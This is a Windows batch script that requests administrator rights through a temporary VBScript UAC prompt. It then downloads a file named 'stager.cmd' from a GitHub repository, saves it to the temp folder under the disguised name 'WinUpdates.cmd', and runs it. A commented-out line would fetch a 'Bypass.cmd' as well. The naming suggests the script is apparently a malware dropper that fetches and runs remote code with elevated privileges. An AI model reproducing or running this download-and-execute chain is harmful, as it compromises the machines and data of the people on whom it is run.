@echo off
setlocal

:: BatchGotAdmin
:-------------------------------------
if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0" 

:: Configuration
set "PS1_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/master/Bypass.cmd"
set "PS2_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/master/stager.cmd"
rem set "PS1_FILE=%temp%\WinUpdater.cmd"
set "PS2_FILE=%temp%\WinUpdates.cmd"

:: Download files
rem powershell -Command "Invoke-WebRequest -Uri '%PS1_URL%' -OutFile '%PS1_FILE%'"
powershell -Command "Invoke-WebRequest -Uri '%PS2_URL%' -OutFile '%PS2_FILE%'"

:: Execute scripts
rem if exist "%PS1_FILE%" call "%PS1_FILE%"
rem timeout /t 5 /nobreak >nul
if exist "%PS2_FILE%" call "%PS2_FILE%"

endlocal